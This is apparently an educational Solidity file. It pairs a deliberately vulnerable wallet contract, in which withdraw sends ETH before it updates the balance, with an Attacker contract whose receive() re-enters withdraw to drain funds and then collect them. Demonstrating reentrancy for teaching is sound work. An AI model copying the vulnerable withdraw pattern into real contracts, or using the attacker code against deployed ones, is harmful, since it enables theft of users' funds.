// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableWallet
 * @notice EXAMPLE VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
 * @dev This contract demonstrates classic reentrancy vulnerability
 *      similar to The DAO hack pattern.
 */
contract VulnerableWallet {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @notice Deposit ETH into the wallet
     */
    function deposit() public payable {
        require(msg.value >= 0.01 ether, "Minimum deposit is 0.01 ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice VULNERABLE: Withdraw all funds
     * @dev This function is vulnerable to reentrancy because:
     *      1. It sends ETH before updating the balance
     *      2. No reentrancy guard is present
     *      3. Does not follow Checks-Effects-Interactions pattern
     */
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");
        
        // VULNERABILITY: External call BEFORE state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER external call - TOO LATE!
        balances[msg.sender] = 0;
        
        emit Withdrawal(msg.sender, balance);
    }
    
    /**
     * @notice Get contract balance
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}


/**
 * @title Attacker
 * @notice Example attacker contract that exploits VulnerableWallet
 */
contract Attacker {
    VulnerableWallet public vulnerableWallet;
    address public owner;
    uint256 public attackCount;
    
    constructor(address _vulnerableWallet) {
        vulnerableWallet = VulnerableWallet(_vulnerableWallet);
        owner = msg.sender;
    }
    
    /**
     * @notice Execute the reentrancy attack
     */
    function attack() external payable {
        require(msg.value >= 0.01 ether, "Need ETH to attack");
        
        // Step 1: Deposit into vulnerable contract
        vulnerableWallet.deposit{value: msg.value}();
        
        // Step 2: Trigger withdrawal (starts the reentrancy)
        vulnerableWallet.withdraw();
    }
    
    /**
     * @notice Fallback function - this is where reentrancy happens
     * @dev When VulnerableWallet sends ETH, this function is called
     *      and it re-enters withdraw() before balance is updated
     */
    receive() external payable {
        attackCount++;
        
        // Keep re-entering while the vulnerable contract has funds
        if (address(vulnerableWallet).balance >= 0.01 ether) {
            vulnerableWallet.withdraw();
        }
    }
    
    /**
     * @notice Withdraw stolen funds to attacker
     */
    function collectStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @notice Check stolen amount
     */
    function getStolenAmount() external view returns (uint256) {
        return address(this).balance;
    }
}
